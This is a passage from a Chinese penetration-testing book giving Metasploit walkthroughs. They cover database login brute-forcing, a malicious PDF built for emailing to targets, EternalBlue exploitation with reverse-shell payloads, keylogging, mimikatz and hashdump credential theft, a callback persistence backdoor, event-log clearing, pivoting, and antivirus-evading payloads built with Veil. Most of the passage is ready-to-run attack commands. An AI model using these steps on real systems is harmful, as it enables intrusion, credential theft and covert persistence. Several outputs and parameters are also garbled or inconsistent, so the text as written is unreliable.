  \ RHOSTS 192.168.29.215 USERPASS_FILE => /root/passwords.txt\n```\n\n从输出信息中可以看出，模块选项参数已成功设置。\n\
  \n4) 实施渗透测试。\n\n执行命令如下：\n\n```\nmsf5 auxiliary(scanner/mysql/mysql_login) exploit\n\
  [＊ ] Auxiliary module execution completed\n```\n\n从输出信息中可以看出，系统尝试使用指定用户名/密码文件中的用户名和密码连接连接\
  \ MySQL 服务器。在尝试了所有用户名和密码后，发现了一个有效的 MySQL 数据库用户和密码。用户名为 `root`，密码为 `123456`。\n\n\
  # 第 31 章\n## 使用 Metasploit 进行高级攻击\n\n![](img/image_rsrc49Z.jpg)\n\n## 对 PostgreSQL\
  \ 数据库服务的渗透攻击\n\nPostgreSQL 是一个免费的对象关系数据库服务（数据库管理系统）。在某些情况下，用户也可以使用数据库服务来存储数据，例如\
  \ Metasploit。下面将介绍如何使用 `postgrs_login` 模块对 PostgreSQL 数据库服务实施渗透测试。\n\n### 使用 `postgres_login`\
  \ 模块对 PostgreSQL 数据库服务实施渗透攻击\n\n具体步骤如下：\n\n1) 选择 `postgres_login` 模块。\n\n执行命令如下：\n\
  \n```\nmsf5> use auxiliary/scanner/postgres/postgres_login\nmsf5 auxiliary(scanner/postgres/postgres_login)>\n\
  ```\n\n2) 查看可配置选项参数。\n\n执行命令如下：\n\n```\nmsf5 auxiliary(scanner/postgres/postgres_login)>\
  \ show options\n```\n\n从输出信息中，你可以看到所有的配置选项参数。接下来将配置所有的选项参数。\n\n3) 配置 `RHOSTS` 选项参数。\n\
  \n执行命令如下：\n\n```\nmsf5 auxiliary(scanner/postgres/postgres_login)> set RHOSTS 192.168.29.223\
  \ RHOSTS => 192.168.29.225\n```\n\n4) 实施渗透测试。\n\n执行命令如下：\n\n```\nmsf5 auxiliary(scanner/postgres/postgres_login)>\
  \ exploit\nmsf5 auxiliary (scanner/postgres/postgres_login)>\n```\n\n从输出信息中可以看出，发现了一个有效的用户名和密码，两者均为\
  \ `postgres`。\n\n# 使用 Metasploit 进行 PDF 攻击\n\nPDF 是一种文件格式。这种文件被广泛使用且容易传输。之前介绍的渗透测试方法都是渗透测试的主动实现。如果目标主机没有监控服务器端口，你需要使用被动渗透测试。此时，你可以尝试向客户端发送包含病毒的\
  \ PDF 文件来执行被动攻击。下面将介绍创建带有病毒的 PDF 文件以实现被动渗透攻击。\n\n### 使用 Adobe PDF Embedded EXE 模块创建\
  \ PDF 病毒文件\n\n具体步骤如下：\n\n1) 使用 `adobe_pdf_embedded_exe` 模块。\n\n执行命令如下：\n\n```\n\
  msf> use exploit/windows/fileformat/adobe_pdf_embedded_exe\nmsf5 exploit(windows/fileformat/adobe_pdf_embedded_exe)>\n\
  ```\n\n2) 查看 `adobe_pdf_embedded_exe` 模块的可用选项。\n\n执行命令如下：\n\n```\nmsf exploit(adobe_pdf_embedded_exe)>\
  \ show options\n```\n\n上述信息显示了 `adobe_pdf_embedded_exe` 模块的所有可用选项。从上面的输出信息中，你可以看到默认使用的\
  \ PDF 病毒文件是 `template.pdf`，输出文件名为 `evil.pdf`。如果用户不想使用默认 PDF 文件，他们可以指定自己的病毒文件和输出文件名。\n\
  \n3) 设置用户想要生成的 PDF 文件名。\n\n执行命令如下：\n\n```\nmsf exploit(adobe_pdf_embedded_exe)>\
  \ set FILENAME test.pdf FILFILENAME => test.pdf\n```\n\n4) 设置 `INFILENAME` 选项。为了使用\
  \ PDF 文件，使用此选项指定用户访问的 PDF 文件的位置。如果用户没有合适的 PDF 攻击文件，也可以使用默认模板文件 `template.pdf`，无需配置此选项。\n\
  \n执行命令如下：\n\n```\nmsf exploit(adobe_pdf_embedded_exe)> set INFILENAME /root/evil.pdf\
  \ INFILENAME => /root/evil.pdf\n```\n注意：此处指定的 PDF 文件不会被生成。\n\n5) 生成 PDF 病毒文件。\n\n\
  执行命令如下：\n\n```\nmsf exploit(adobe_pdf_embedded_exe)> exploit\n```\n输出信息显示 `test.pdf`\
  \ 文件已生成并保存到 `/root/` 下。接下来，用户可以通过电子邮件或其他手段将创建的 PDF 文件发送给目标主机，然后建立监控。当目标主机打开 PDF\
  \ 文件时，可能会受到攻击。\n\n利用 MS17_010 漏洞进行攻击\n\nMS17_010 是一个被“永恒之蓝”（勒索软件）利用的 Windows 漏洞。渗透测试人员可以通过利用此漏洞发送特殊设计的消息到\
  \ Microsoft Message Block 1.0 (`SMBv1`) 服务器，允许远程代码执行。下面将介绍利用 MS17_010 漏洞对 WindowsServer\
  \ 2008 R2 (`x64`) 进行渗透测试。\n\n### 使用 MS17_010 漏洞实施渗透测试\n\n具体步骤如下：\n\n1) 查询可以利用 MS17_010\
  \ 的渗透测试模块。\n\n执行命令如下：\n\n```\nmsf5> search ms17-010\n```\n\n从输出信息中发现了 5 个渗透测试模块。通过分析描述信息可以看出第二个是扫描模块；第三是漏洞利用模块。在实施渗透测试之前，使用扫描模块检测是否存在漏洞。\n\
  \n2) 选择 `smb_ms17_010` 模块并查看其配置选项。\n\n执行命令如下：\n\n```\nmsf5> use auxiliary/scanner/smb/smb_ms17_010\n\
  msf5 auxiliary(scanner/smb/smb_ms17_010)> show options\n```\n\n上述输出信息显示了当前模块的所有配置选项。此时只需设置目标地址即可运行该模块来检测是否存在\
  \ MS17_010 漏洞。\n\n3) 配置 `RHOSTS` 选项。\n\n执行命令如下：\n\n```\nmsf5 auxiliary(scanner/smb/smb_ms17_010)>\
  \ set RHOSTS 192.168.29.215\n```\n\n4) 实施漏洞扫描测试。\n\n执行命令如下：\n\n```\nmsf5 auxiliary(scanner/smb/smb_ms17_010)>\
  \ exploit\n```\n\n\n\n从输出信息可以看出，目标主机存在 `MS17_010` 漏洞。接下来，将利用该漏洞对目标主机进行渗透测试。\n\n\
  ### 5) 选择 `ms17_010_eternalblue` 模块。\n\n执行命令如下：\n\n```\nmsf5 auxiliary(scanner/smb/smb_ms17_010)>\
  \ use exploit/windows/smb/ms17_010\n```\n\n### 6) 加载攻击载负载。\n\n执行命令如下：\n\n```\nmsf5\
  \ exploit(windows/smb/ms17_010_eternalblue)> set payload windows/x64/meterpreter/reverse_tcp\
  \ payload => windows/x64/meterpreter/reverse_tcp\n```\n\n### 7) 查看所有配置选项参数。\n\n\
  执行命令如下：\n\n```\nmsf5 exploit(windows/smb/ms17_010_eternalblue)> show options\n```\n\
  `Module options (exploit/windows/smb/ms17_010_eternalblue):`\n\n从输出信息中，你可以看到所有的配置选项参数。接下来，配置必须配置的选项：`RHOSTS`\
  \ 和 `LHOST`。\n\n### 8) 配置选项参数。\n\n执行命令如下：\n\n```\nmsf5 exploit(windows/smb/ms17_010_eternalblue)>\
  \ set RHOSTS 192.168.29.215 RHOSTS => 192.168.29.215\nmsf5 exploit(windows/smb/ms17_010_eternalblue)>\
  \ set LHOST 192.168.29.223\n```\n\n### 9) 执行渗透测试。\n\n执行命令如下：\n\n```\nmsf5 exploit(windows/smb/ms17_010_eternalblue)>\
  \ exploit\nmeterpreter>\n```\n从输出信息可以看出，成功获取了一个 `Meterpreter` 会话。此外，命令行提示符显示为 `meterpreter\
  \ >`。\n\n此时，用户可以在 `Meterpreter Shell` 下执行大量命令。用户可以使用 `help` 命令查看所有支持的命令：\n\n```\n\
  meterpreter> help\n```\n\n上述输出信息显示了在 Meterpreter 命令行下可以运行的所有命令。输出信息中每个命令的功能都有详细描述。用户可以根据需要执行相应的命令。\n\
  \n#### 进入目标主机的 shell。\n\n执行命令如下：\n\n```\nmeterpreter> shell\nProcess 1216 created.\
  \ Channel 1 created.\n```\n从输出信息中，我们可以看到已成功退出了目标主机的 shell 并返回到 Meterpreter 会话。\n\
  \n#### 从 Meterpreter 会话返回 MSF 终端。\n\n执行命令如下：\n\n```\nmeterpreter> background\n```\n\
  如果你想再次进入 Meterpreter 会话，可以使用 `sessions` 命令。\n\n#### 使用 `sessions` 命令查看已建立的 Meterpreter\
  \ 会话，如下：\n\n```\nmsf5 exploit(windows/smb/ms17_010_eternalblue)> sessions\nActive\
  \ sessions\nmeterpreter>\n```\n从输出信息可以看出，成功启动了第一个交互式会话。\n\n# 第 32 章\n\n## 控制 Meterpreter\
  \ 会话\n\n![](img/image_rsrc49Z.jpg)\n\n## 控制 Meterpreter 会话\n\n当渗透测试人员利用漏洞成功渗透目标系统并获取\
  \ Meterpreter 会话时，他可以使用漏洞模块支持的 Meterpreter 命令来控制 Meterpreter 会话，以获取更多关于目标主机的信息或控制目标主机，例如关闭杀毒软件、键盘记录、截图、提升权限和创建账户等。本节将以获取的\
  \ Meterpreter 会话为例，介绍如何控制 Meterpreter 会话。\n\n### 关闭杀毒软件\n\n通常情况下，用户会在电脑上安装杀毒软件。为了方便其他操作，用户可以关闭杀毒软件。渗透测试人员获取目标主机的\
  \ shell 后，可以使用 `run killav` 命令关闭目标主机的杀毒软件。\n\n命令如下：\n\n```\nmeterpreter> run killav\n\
  ```\n从输出信息中，我们可以看到目标主机的杀毒服务已被杀死，`cmd.exe` 程序已结束。\n\n### 获取目标主机的详细信息\n\n为了更好地了解目标主机的信息，可以使用\
  \ `sysinfo` 命令查看目标主机的系统信息。\n\n执行命令如下：\n\n```\nmeterpreter> sysinfo\n```\n从输出信息中可以看到目标主机的详细信息。例如，计算机名为\
  \ `WIN-TJUIK7N16BP`；操作系统类型为 `Windows 2008 R2 (Build 7600)`；架构为 `x64` 等。\n\n用户还可以使用\
  \ `run scraper` 命令查看目标主机的详细信息，并将其下载保存到本地。\n\n执行命令如下：\n\n```\nmeterpreter> run scraper\n\
  ```\n从输出信息可以看出，已获取目标主机的详细信息。此外，获取的信息已下载并保存到本地的 `C:\\Windows\\TEMP` 目录。这些信息以 Windows\
  \ 注册表的形式保存。\n\n### 检查目标是否运行在虚拟机上\n\n用户还可以检查目标是否运行在虚拟机上。\n\n执行命令如下：\n\n```\nmeterpreter>\
  \ run post/windows/checkvm\n[*] Checking if `WIN-TJUIK7N16BP` is a Virtual Machine\n\
  [ This is a VMware\n```\n从输出信息可以看出，这是一个虚拟机。\n\n### 访问文件系统\n\nMeterpreter 支持各种文件系统命令，与\
  \ Linux 命令基本相似。现在使用这些基本命令访问文件系统，例如查看当前目录、当前目录下的文件以及创建目录。\n\n#### 使用 `pwd` 命令查看当前目录。\n\
  \n执行命令如下：\n\n```\nmeterpreter> pwd\nC:\\Users\\Public\n```\n从输出信息中可以看到当前目录为 `C:\\\
  Users\\Public`。\n\n#### 使用 `ls` 查看当前目录下的文件。\n\n执行命令如下：\n\n```\nmeterpreter> ls\n\
  Listing: C:\\Users\\Public\\Desktop\ndesktop.ini\n```\n可以看到当前目录下有一个名为 `desktop.ini`\
  \ 的文件。\n\n#### 3) 使用 `rm` 命令删除 `desktop.ini`。\n\n执行命令如下：\n\n```\nmeterpreter> rm\
  \ desktop.ini\n```\n执行上述命令后将没有输出。此时，可以再次查看文件列表以确定文件是否已删除。如下：\n\n```\nmeterpreter>\
  \ ls\nNo entries exist in C:\\Users\\Public\\ Desktop\n```\n从输出信息可以看出，`C:\\Users\\\
  Public` 下没有文件。\n\n#### 4) 切换工作目录。\n\n执行命令如下：\n\n```\nmeterpreter> cd..\nC:\\Users\\\
  Public\n```\n执行上述命令后，你将切换到上一级目录，即 `C:\\Users\\Public`。此时，再次查看当前目录的文件列表：\n\n####\
  \ 5) 创建名为 `test` 的目录。\n\n执行命令如下：\n\n```\nmeterpreter> mkdir sample\nCreating directory:\
  \ sample\n```\n从输出信息可以看出，成功创建了名为 `sample` 的目录。\n\n### 上传/下载文件\n\n在 Meterpreter 会话中，用户还可以上传和下载文件。其中，下载文件的语法格式如下：`Download\
  \ file`。上传文件的语法格式如下：`upload file`。\n\n#### 从目标主机下载 `Pictures` 文件。\n\n执行命令如下：\n\n\
  ```\nmeterpreter> download Pictures\n```\n看到上述输出信息意味着 `Pictures` 文件已下载成功。\n\n####\
  \ 将本地的 `passwords.txt` 文件上传到目标主机。\n\n执行命令如下：\n\n```\nmeterpreter> upload /root/passwords.txt\n\
  ```\n\n\n\n看到上述输出信息表明 `passwords.txt` 文件已成功上传。此时，你可以检查当前的文件列表以确认文件已成功上传，如下所示：￼\n\
  \n```\nmeterpreter> ls\n```\n\n从输出信息中，你可以看到用户上传的 `passwords.txt` 文件。\n\n## 键盘捕获\n\
  \n测试渗透人员可以通过启动键盘捕获功能，获取目标用户输入的信息，例如用户名和密码。\n\n其中，启动键盘捕获的命令如下：\n\n```\nmeterpreter\
  \ > keyscan_start\n```\n\n正在启动键盘监听器...\n\n从输出信息可以看出，键盘捕获已成功启动。为了模拟这一测试过程，用户可以在目标主机上手动输入一些信息，供测试渗透人员捕获。\n\
  \n当用户在目标主机上输入某些信息时，可以在攻击主机上使用 `keyscan_dump` 命令获取输入的信息。\n\n```\nmeterpreter > keyscan_dump\n\
  ```\n\n正在转储捕获的按键... < Return > < Return > < Return > < N1 > < Return > 2 < Return\
  \ > 34\n\n从输出信息可以看出，目标用户输入的信息已成功捕获。如果用户不想继续捕获目标主机的数据，可以停止键盘捕获。\n\n执行以下命令：\n\n```\n\
  meterpreter > keyscan_stop\n```\n\n正在停止键盘监听器...\n\n看到上述输出信息表明键盘捕获已成功停止。\n\n## 截图\n\
  \n用户可以通过实现截图功能查看目标用户正在执行的操作，例如打开文件和网页。以下命令将对目标屏幕进行截图。\n\n执行以下命令：\n\n```\nmeterpreter\
  \ > screenshot\n```\n截图已保存至:/root/example.jpeg\n\n从输出信息可以看出，目标主机的屏幕已成功拦截并保存到 `/root/example.jpeg`\
  \ 文件中。此时，用户可以查看截图以确认目标用户执行的操作。\n\n如截图中所示，目标用户正在浏览 CSDN 博客网页。\n\n## 列举用户\n\n渗透测试员还可以使用\
  \ `run post/windows/gather/enum_logged_on_user` 命令枚举目标主机上的用户。\n\n执行命令如下：￼\n\n```\n\
  meterpreter> run post/windows/gather/enum_logged_on_users\n```\n\n从输出信息中，你可以看到目标主机上只有一个用户，其用户为\
  \ `Administrator`。\n\n## 权限提升\n\n在某些情况下，用户获取的 Meterpreter 会话会受到用户权限的限制，这将影响渗透测试员在目标系统中的操作，例如修改注册表、安装后门或导出密码。此时，用户可以使用\
  \ `getsystem` 命令提升当前用户的权限。接下来将介绍如何提升用户权限。\n\n### 提升普通用户的权限\n\n首先检查当前用户的权限信息。\n\n\
  执行命令如下：￼\n\n```\nmeterpreter> getuid\n```\n服务器用户名: exampleserver-PC\\bob\n\n```\n\
  \n从输出信息中，我们可以看到当前用户是一个普通用户，其用户名为 `bob`。接下来，用户将提升权限。\n\n执行命令如下：￼\n\n```\nmeterpreter>\
  \ getsystem\n```\n\n看到上述输出信息，意味着当前用户已成功提升。此时，再次检查用户权限。\n\n结果如下：￼\n\n```\nmeterpreter>\
  \ getuid\n```\n服务器用户名: NT AUTHORITY\\SYSTEM\n\n```\n\n从输出信息中，你可以看到当前用户的权限为 `NT AUTHORITY\\\
  SYSTEM`。这表明用户的权限已成功提升。\n\n## 获取用户密码\n\n当用户获取的 Meterpreter 会话具有某些权限时，就可以获取用户密码。接下来将使用\
  \ `hashdump` 命令获取用户密码。\n\n执行命令如下：\n\n```\nmeterpreter> hashdump Administrator: 500:\n\
  ```\n\n从输出信息中，我们可以看到目标主机上有 3 个用户，即 `Administrator`、`bob` 和 `Guest`。\n\n上述输出信息的格式为\
  \ `username: SID: LM hash: NTLM hash`。其中，LM 哈希 `ccd3b653b51404 eead3b653b51404ee`\
  \ 和 NTLM 哈希 `31d6ccy0d16ae981b23c89d7e0c045c0` 空密码。\n\n使用 `hashdump` 命令获得的哈希密码需要进一步破解才能获得真实密码。此时，用户也可以通过加载\
  \ `mimikatz` 模块获取用户密码。然而，该模块的命令适用于 32 位系统。接下来将介绍如何使用 `mimikatz` 模块获取用户密码。\n\n具体步骤如下：\n\
  \n1) 加载 `mimikatz` 模块。\n\n执行命令如下：￼\n\n```\nmeterpreter> load mimikatz\n```\n\n看到上述输出信息，意味着\
  \ `mimikatz` 模块已成功加载。此时，你可以使用 `help mimikatz` 命令查看 `mimikatz` 模块支持的所有命令。详情如下：\n\n\
  ```\nmeterpreter> help mimikatz\n```\n\n从上述输出中，你可以看到 `mimikatz` 模块支持的所有命令。接下来，我们将介绍如何使用这些命令获取用户密码。\n\
  \n2) 使用 `mimikatz` 命令获取用户密码。\n\n执行命令如下：￼\n\n```\nmeterpreter> mimikatz -f\n```\n\
  \n从输出信息中，我们可以看到目标主机上有 3 个用户，即 `Administrator`、`bob` 和 `Guest`。用户的密码已成功捕获。\n\n3)\
  \ 使用 `msv` 命令获取用户哈希。\n\n执行命令如下：￼\n\n```\nmeterpreter> msv\n```\n\n从输出信息可以看出，用户哈希已成功捕获。\n\
  \n4) 使用 `wdigest` 命令获取内存中的明文密码。\n\n执行命令如下：￼\n\n```\nmeterpreter> wdigest\n```\n\n\
  从输出信息中，我们可以看到登录用户的明文密码。\n\n## 第 33 章\n\n## 使用 Metploit 绑定\n\n![](img/image_rsrc49Z.jpg)\n\
  \n### 绑定进程\n\nMeterpreter 可以独立运行，也可以绑定其他进程。当 Meterpreter 独立运行时，很容易被发现。如果你将其绑定到系统中运行的进程，就可以实现持久化。绑定方法的介绍如下：\n\
  \n1) 查看系统中运行的进程。\n\n执行命令如下：￼\n\n```\nmeterpreter> ps\n```\n\n从输出信息中可以看到系统中运行的所有进程。输出包含\
  \ 7 列，分别代表 `PID`（进程 ID）、`PPID`（父进程 ID）、`Name`（进程名）、`Arch`（架构）、`Session`（会话）、`User`（用户名）和\
  \ `Path`（路径）。例如，这里将选择 Meterpreter 绑定到 `winlogon.exe` 进程。其中，进程 ID 为 400。\n\n2) 使用\
  \ `getpid` 命令查看当前进程 ID。\n\n执行命令如下：￼\n\n```\nmeterpreter> getpid\n```\n当前 pid: 1096\n\
  \n从输出信息中，可以看到当前 PID 为 1096。\n\n3) 使用 `migrate` 命令绑定进程。\n\n执行命令如下：￼\n\n```\nmeterpreter>\
  \ migrate 400\n```\n[＊] 正在从 1096 迁移到 400...\n[＊] 迁移成功完成。\n\n4) 绑定进程并捕获键盘记录。\n\n\n\
  \n\n在 Meterpreter 中，渗透测试人员还可以使用 `execute` 命令在目标系统上执行应用程序。\n\n该命令的语法格式如下：\n\n`execute\
  \ [options] -f command`\n\n执行命令如下：\n\n```\nmeterpreter> execute -s 1-f cmd\n```\n\
  \n进程 2260 已创建。\n\n从输出信息中可以看到，创建了一个 ID 为 `2260` 的进程。此时，你可以看到在目标主机上已启动了 `CMD` 程序。\n\
  \n## 启用远程桌面\n\n在 Meterpreter 中，用户还可以启动远程桌面，以便远程连接到目标主机。下文将描述如何启用远程桌面并进行远程登录。\n\n\
  执行命令如下如下：\n\n```\nmeterpreter> run post/windows/manage/enable_rdp\n```\n\n看到上述输出信息，表示远程桌面已成功启动。接下来，用户还需要检查远程用户的空闲时间。\n\
  \n执行命令如下：\n\n```\nmeterpreter> idletime\n```\n\n用户空闲时间为：23 天 7 小时 16 分 52 秒\n\n\
  从输出信息中可以看出，用户的空闲时间为 23 天 7 小时 16 分 52 秒。接下来，渗透测试人员可以远程访问目标主机的桌面。\n\n用户可以通过某些方法（如\
  \ `hashdump` 命令和 `mimikatz` 模块）获取目标主机的用户名和密码。此时，用户可以使用获取的用户信息在 Kali 主机远程连接到目标主机。\n\
  \n下文将使用 `rdesktop` 命令远程连接桌面。\n\n1) 执行命令如下：\n\n```\nroot@exampleserver:～# rdesktop\
  \ 192.168.29.143\n```\n\n执行上述命令后，将打开远程桌面。\n\n2) 在此界面上选择已登录的用户以登录目标主机。在此处选择“其他用户”（other\
  \ users）选项，将显示界面。\n\n3) 在此界面中输入远程登录的用户名和密码。然后点击登录按钮，即可成功连接到远程桌面。从此界面可以看出，你已成功连接到目标主机的远程桌面。\n\
  \n## 第 34 章\n\n### 持久化后门\n\n![](img/image_rsrc49Z.jpg)\n\n成功获取目标系统的访问权限后，渗透测试人员显然不想以同样辛苦的方式重新获取访问。由于\
  \ Meterpreter 是基于内存 DLL 建立的连接，只要目标主机关闭，Meterpreter 连接就会断开。\n\n因此，为了方便后续的渗透测试，可以创建一个持久化的后门。这样，只要目标主机开机，它就会自动与攻击主机建立连接。此外，创建持久化后门后，即使连接中断，也不会影响工作。下文将介绍使用\
  \ `run persistence` 命令创建持久化后门。\n\n其中，语法格式如下：\n\n`run persistence -X -i -p -r`\n\n\
  使用 `run persistence` 命令创建持久化后门。\n\n执行命令如下：\n\n```\nmeterpreter> run persistence\
  \ -X -i 5-p 8888192.168.29.134\n```\n\n从输出信息中，我们可以看到目标主机上创建了一个可执行脚本。其中，脚本文件名为 `MIknXebtV.vbs`。此时，用户可以在目标主机的\
  \ `C:\\Windows\\TEMP` 目录下看到该文件。\n\n用户在目标主机上创建持久化后门后，还需要本地建立一个监听器。这样，当目标主机重启时，它会自动与攻击主机建立连接。下文将使用\
  \ `exploit/multi/handler` 模块建立监控。\n\n1) 选择 `exploit/multi/handler` 模块。\n\n执行命令如下：\n\
  \n```\nmsf5> use exploit/multi/handler\nmsf5 exploit(multi/handler)>\n```\n\n2)\
  \ 加载攻击 payload 并查看配置选项。\n\n执行命令如下：\n\n```\nmsf5 exploit(multi/handler)> set payload\
  \ windows/meterpreter/reverse_tcp\n```\n\n从输出信息中可以看出，所需的项 `LHOST` 尚未配置。此外，该模块监控的端口为\
  \ `4444`。由于端口 `4444` 之前被监控过，我们将修改另一个监控端口，例如 `8888`。\n\n3) 配置攻击 payload 选项。\n\n执行命令如下：\n\
  \n```\nmsf5 exploit(multi/handler)> set LHOST 192.168.29.134\nLHOST => 192.168.29.134\n\
  msf5 exploit(multi/handler)> set LPORT 8888\nLPORT => 8888\n```\n\n4) 建立监控。\n\n\
  执行命令如下：\n\n```\nmsf5 exploit(multi/handler)> exploit\n```\n\n[＊] Started reverse\
  \ TCP handler on 192.168.29.134:8888\n\n从输出信息中，我们可以看到当前主机正在监听端口 `8888`，IP 地址为 `192.168.29.134`。\n\
  \n5) 当目标主机重启时，它将主动与攻击主机建立连接。\n\n## 清除痕迹\n\n192.168.29.134:8888\n\n从输出信息中，我们可以看到当前主机正在监听端口\
  \ `8888`，IP 地址为 `192.168.29.134`。当目标主机重启时，它将主动与攻击主机建立连接。如下：\n\n[＊ ] 192.168.29.134\n\
  \n从输出信息中，我们可以看到连接已成功。\n\n## 清除痕迹\n\n当渗透测试人员入侵目标主机时，所有操作都会记录在日志。因此，为了不被目标系统发现，需要清除痕迹。此时，用户可以使用\
  \ `clearev` 命令。\n\n执行命令如下：\n\n```\nmeterpreter> clearev\n```\n\n从输出信息中可以看出，90。\n\
  \n## 构建跳板\n\n跳板是指使用受漏洞的主机作为跳板来渗透无法直接访问的系统。下文将介绍跳板的方法。\n\n具体步骤如下：\n\n1) 打开 Meterpreter\
  \ 会话。\n\n执行命令如下：\n\n```\n[＊] Meterpreter session 1 opened (192.168.2.10:4444) at\
  \ 2019-04-17 15:56:24 +0800\nmeterpreter>\n```\n\n从上述会话可以看出，攻击主机的地址为 `192.168.2.10`，目标主机的地址为\
  \ `192.168.1.1`。显然这两个主机不在同一个网络。因此，如果你想渗透网络中的其他主机，需要添加相应的路由记录。\n\n2) 检查目标系统上的子网。\n\
  \n执行命令如下：\n\n```\nmeterpreter> run get_local_subnets\n```\n\n从输出信息中，可以看出目标系统所在的子网为\
  \ `192.168.1.0/24`。\n\n3) 将攻击会话放入后台运行并添加路由记录。其中，添加路由的语法格式如下：`route add [subnet][mask]\
  \ [session ID]`\n\n添加路由记录。\n\n执行命令如下：\n\n```\nmeterpreter> background\n[＊ ] Route\
  \ added\n```\n\n从输出信息中，可以看到路由已成功添加。此时，用户可以使用 `route print` 命令查看已添加的路由记录。如下：\n\n\
  ```\nmsf5 exploit(handler)> route print\n```\n\n从输出信息中，可以看出 `192.168.1.0/24` 的路由记录已成功添加。\n\
  \n\n\n\n\n从输出信息中，你可以看到 `auto_add_route` 插件已成功加载。接下来，使用 `exploit` 命令对其他主机进行渗透测试，如下：\n\
  \n```\nmsf5 exploit(handler)> exploit\n```\n\n# 第 35 章\n\n## 反杀毒 Payload 攻击\n\n\
  ![](img/image_rsrc49Z.jpg)\n\nKali Linux 提供了一个名为 `Veil Evasion` 的工具，它可以用于生成不同类型的攻击\
  \ payload 文件。其中，生成的攻击 payload 文件在大多数情况下可以绕过常见的反杀毒软件。本节将介绍如何使用 `Veil Evasion` 工具生成反杀毒攻击\
  \ payload 文件以实现攻击。\n\n## 安装并初始化 Veil Evasion 工具\n\nKali Linux 默认没有安装 `Veil Evasion`\
  \ 工具。因此，在使用该工具之前需要先对其进行安装。\n\n执行命令如下：\n\n```bash\nroot@exampleserver:～# apt-get\
  \ install veil-evasion -y\n```\n\n执行上述命令后，如果没有报错，则说明 `Veil Evasion` 工具已安装成功。接下来，你可以启动该工具。\n\
  \n具体步骤如下：\n\n1) 启动 `Veil Evasion` 工具。\n\n执行命令如下：\n\n```bash\nroot@exampleserver:～#\
  \ veil\n```\n\n上述输出信息显示了当前操作系统的基本信息以及 `Veil Evasion` 工具的安装位置。\n\n这里会提示是否继续安装 `Veil`\
  \ 工具，输入 `y` 继续安装，随后将显示以下信息。\n\n[＊] 正在初始化包安装\n[＊] 正在下载二进制依赖\n\n从输出信息可以看出，软件包正在初始化。在此过程中还会安装其他软件，即\
  \ `Python 3.4.4`、`pywin32-220`、`pycrypto-2.6.1`、`Ruby 1.8.7-p371` 和 `Autolt v3.3.14.2`。其中，首先安装\
  \ `Python 3.4.4`。\n\n2) 此对话框是 `Python 3.4.4` 的欢迎界面。此时，点击 `Next` 按钮，将显示选择安装位置的对话框。\n\
  \n3) 点击 `Next` 按钮，将显示自定义 `Python` 包的对话框。\n\n4) 点击 `Next` 按钮，将显示 `Python` 安装完成的对话框。\n\
  \n5) 点击 `Finish` 按钮，将显示 `pywin32` 安装对话框。\n\n6) 点击 `Next` 按钮，将显示设置安装位置的对话框。\n\n7)\
  \ 点击 `Next` 按钮，将显示准备安装的对话框。\n\n8) 点击 `Next` 按钮开始安装 `pywin32` 程序。安装完成后，将显示安装完成的对话框。\n\
  \n9) 点击 `End` 按钮，将显示 `pycrypto` 安装对话框。\n\n10) 点击 `Next` 按钮，将显示设置安装位置的对话框。\n\n11)\
  \ 点击 `Next` 按钮，将显示准备安装的对话框。\n\n12) 点击 `Next` 按钮开始安装 `pycrypto` 程序。安装完成后，将显示对话框。\n\
  \n13) 点击 `End` 按钮，将显示选择并设置语言的对话框。\n\n14) 此处使用默认语言 `English` 并点击 `OK` 按钮，将显示安装 `Ruby`\
  \ 的许可协议对话框。\n\n15) 选取 `I accept the License` 单选按钮，然后点击 `Next` 按钮。将显示选择安装位置的对话框。\n\
  \n16) 此处使用默认设置，然后点击 `Install` 按钮开始安装 `Ruby` 程序。安装完成后，将显示所示对话框。\n\n17) 点击 `Finish`\
  \ 按钮，将显示 `Autolt` 的欢迎对话框。\n\n18) 点击 `Next` 按钮，将显示安装 `Autolt` 程序的许可协议信息。\n\n19) 点击\
  \ `I Agree` 按钮，将显示设置对话框。\n\n20) 此处使用默认设置，然后点击 `Next` 按钮，将显示对话框。\n\n21) 此处使用默认设置，然后点击\
  \ `Next` 按钮，将显示选择组件的对话框。\n\n22) 点击 `Next` 按钮，将显示设置安装位置的对话框。\n\n23) 在此处点击 `Install`\
  \ 按钮开始安装 `Autolt` 程序。安装完成后，显示对话框。\n\n24) 当上述程序安装完成后，`Veil` 工具将完成初始化。\n\n## 生成反杀毒攻击\
  \ payload\n\n通过配置设置，`Veil` 工具可以正常使用。接下来，我们将使用 `Veil Evasion` 工具生成反杀毒攻击 payload 文件。\n\
  \n使用 `Veil Evasion` 工具生成反杀毒攻击 payload 文件。\n\n具体步骤如下：\n\n1) 启动 `Veil Evasion` 工具。\n\
  \n执行命令如下：\n\n```bash\nroot@exampleserver:～# veil\n```\n\n从输出信息中可以看出，命令行提示符为 `Veil\
  \ >`。可以说 `Veil` 工具的交互模式已成功进入。接下来，你可以选择工具创建攻击 payload 文件。\n\n2) 使用 `Evasion` 工具。\n\
  \n执行命令如下：\n\n```\nVeil>: use Evasion\n```\n\n从输出信息可以看出，加载了 41 种攻击 payload。\n\n3)\
  \ 查看 `Evasion` 工具支持的攻击。执行以下命令：\n\n```\nVeil/Evasion>: list\n```\n\n从输出信息中可以看到所有攻击\
  \ payload。例如，这里我们选择 `meterpreter/revtcp.py`。\n\n执行命令如下：\n\n```\nVeil/Evasion>: use\
  \ meterpreter/revtcp\n```\n\n4) 配置 `LHOST` 选项并查看所有配置。\n\n执行命令如下：\n\n```\n[meterpreter/revtcp_]:\
  \ set LHOST 192.168.29.134\n[meterpreter/revtcp_]: options\n```\n\n从输出信息可以看出，`LHOST`\
  \ 选项已成功配置。接下来可以生成攻击 payload。\n\n5) 生成攻击 payload。\n\n执行命令如下：\n\n```\n[meterpreter/revtcp_]:\
  \ generate\n```\n\n从输出信息可以看出生成了可执行文件 `test.exe`，该文件保存在 `/var/lib/veil/output/compiled/`。此时将\
  \ `test.exe` 发送到目标主机即可使用该 payload。\n\n用户也可以在命令行模式下生成攻击 payload。这里以 `rev_tcp` 模块为例，执行命令如下：\n\
  \n```bash\nroot@exampleserver:～ veil -t Evasion -p meterpreter/rev_tcp.py --ip 192.168.29.134\
  \ --port 4444 payload.exe\n```\n\n从输出信息可以看出成功生成了可执行文件 `payload.exe`。\n\n同样，在用户创建了攻击\
  \ payload 文件后，还需要创建一个远程监听器。这样，当目标主机执行攻击 payload 文件时，它会主动与攻击主机建立连接。\n\n使用 Metasploit\
  \ 的 `exploit/multi/handler` 模块创建监听器如下：\n\n```bash\nroot@exampleserver:～# msfconsole\n\
  msf5 exploit(multi/handler)> exploit\n```\n\n\n\n\n# 学习使用工具攻击和破解 WIFI 及网站密码\n\n\
